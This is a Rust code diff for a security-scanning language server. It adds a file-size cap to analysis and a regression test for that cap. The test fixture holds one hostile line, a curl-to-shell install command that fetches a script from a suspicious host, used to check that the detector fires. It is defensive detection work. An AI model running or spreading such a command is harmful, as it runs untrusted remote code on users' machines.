@@ -113,6 +113,33 @@ impl Backend {
 
     /// Analyze `uri`'s `text` and publish (or clear) its diagnostics.
     async fn analyze_and_publish(&self, uri: Url, text: String, version: Option<i32>) {
+        // SIZE CAP: never analyze a buffer over the shared `scan::MAX_FILE_SIZE`
+        // ceiling (10 MiB). `analysis_context` copies the whole buffer into
+        // `raw_bytes` and every rule runs over it; on this current-thread
+        // runtime a multi-hundred-MB opened log/source buffer would stall
+        // diagnostics for ALL open documents. Over the cap: CLEAR this
+        // document's diagnostics (publish empty — never leave stale findings)
+        // and log VISIBLY why, mirroring the file scanner's skip-with-notice.
+        // (`diagnostics_for` enforces the same bound; this pre-check skips the
+        // work and surfaces the reason to the editor.)
+        if exceeds_analysis_cap(&text) {
+            self.client
+                .log_message(
+                    MessageType::WARNING,
+                    format!(
+                        "tirith: {uri} is {} bytes — over the {}-byte analysis \
+                         cap; not analyzed, diagnostics cleared for this document",
+                        text.len(),
+                        tirith_core::scan::MAX_FILE_SIZE
+                    ),
+                )
+                .await;
+            self.client
+                .publish_diagnostics(uri, Vec::new(), version)
+                .await;
+            return;
+        }
+
         // Derive the file path from the URI. A non-`file:` URI (or an
         // unparseable one) has no path we can profile, so it gets no
         // diagnostics — same outcome as an unrecognised file type.
@@ -220,6 +247,15 @@ impl LanguageServer for Backend {
 // Pure analysis → diagnostics (testable without the async server)
 // ===========================================================================
 
+/// Whether `text` exceeds the shared analysis ceiling
+/// ([`tirith_core::scan::MAX_FILE_SIZE`], 10 MiB). The LSP document path
+/// enforces the SAME cap as the file scanner: an oversized buffer is copied
+/// whole into `raw_bytes` and run through every rule, which on the
+/// current-thread LSP runtime could stall diagnostics for ALL open files.
+fn exceeds_analysis_cap(text: &str) -> bool {
+    text.len() as u64 > tirith_core::scan::MAX_FILE_SIZE
+}
+
 /// Analyze the buffer `text` for the file at `path` and return the LSP
 /// diagnostics tirith would surface for it. The PURE core of the server: no
 /// async, no I/O, no network — exactly the logic exercised by `did_open` /
@@ -229,6 +265,15 @@ impl LanguageServer for Backend {
 /// unrecognised file type returns an empty `Vec` (the server then CLEARS any
 /// prior diagnostics for the document).
 pub fn diagnostics_for(path: &Path, text: &str) -> Vec<Diagnostic> {
+    // SIZE CAP (defense in depth — `analyze_and_publish` pre-checks this and
+    // additionally logs): a buffer over the shared `scan::MAX_FILE_SIZE` ceiling
+    // is never analyzed, so the per-context `analyze` below never copies an
+    // unbounded buffer into `raw_bytes`. Keeps this pure `pub fn` safe for any
+    // caller.
+    if exceeds_analysis_cap(text) {
+        return Vec::new();
+    }
+
     let Some(profile) = lsp_profiles::profile_for_path(path) else {
         return Vec::new();
     };
@@ -940,6 +985,46 @@ mod tests {
         assert!(
             diagnostics_for(Path::new("README.md"), body).is_empty(),
             "a benign README must yield no diagnostics"
+        );
+    }
+
+    /// SIZE CAP regression: a buffer larger than `scan::MAX_FILE_SIZE` is NOT
+    /// analyzed (yields no diagnostics) even when it contains a line that fires
+    /// a rule under the cap. Guards the LSP path against copying an unbounded
+    /// buffer into `raw_bytes` and running every rule on a huge opened document
+    /// on the current-thread runtime. The under-cap control proves the empty
+    /// result is the cap, not a routing/analysis miss.
+    #[test]
+    fn oversize_buffer_is_not_analyzed() {
+        let host = suspicious_host();
+        let install_block = format!("```sh\ncurl http://{host}/install.sh | sh\n```\n");
+
+        // Control: the firing line in a small README DOES produce a diagnostic.
+        let small = format!("# Setup\n\n{install_block}");
+        assert!(
+            !exceeds_analysis_cap(&small),
+            "the control buffer must be under the cap"
+        );
+        assert!(
+            !diagnostics_for(Path::new("README.md"), &small).is_empty(),
+            "control: a suspicious install line under the cap must produce a diagnostic"
+        );
+
+        // A buffer one filler past the cap, still containing the firing line.
+        let cap = tirith_core::scan::MAX_FILE_SIZE as usize;
+        let filler = "# padding line, not suspicious\n";
+        let mut big = String::with_capacity(cap + install_block.len() + filler.len());
+        big.push_str(&install_block);
+        while big.len() <= cap {
+            big.push_str(filler);
+        }
+        assert!(
+            exceeds_analysis_cap(&big),
+            "the test buffer must exceed the analysis cap"
+        );
+        assert!(
+            diagnostics_for(Path::new("README.md"), &big).is_empty(),
+            "a buffer over the analysis cap must not be analyzed"
         );
     }
 
